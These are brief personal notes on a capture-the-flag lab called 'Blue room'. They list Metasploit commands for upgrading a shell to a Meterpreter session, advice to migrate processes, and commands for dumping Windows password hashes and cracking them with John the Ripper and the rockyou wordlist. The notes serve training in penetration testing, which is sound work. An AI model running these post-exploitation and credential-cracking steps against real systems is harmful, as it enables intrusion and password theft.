# Blue room

Shell to Meterpreter Upgrade

~~~
sessions -u <session wishing to updgrade>
use post/multi/manage/shell_to_meterpreter
~~~

- Just because we are system doesn't mean our process is. Once we are upgraded we need to migrate to another process.

- hashdump passwords

~~~
hashdump (run in metasploit)
john -w=/usr/share/wordlists/rockyou.txt --format=NT <file with hashes> (For this room I needed to speicify the has type)
~~~

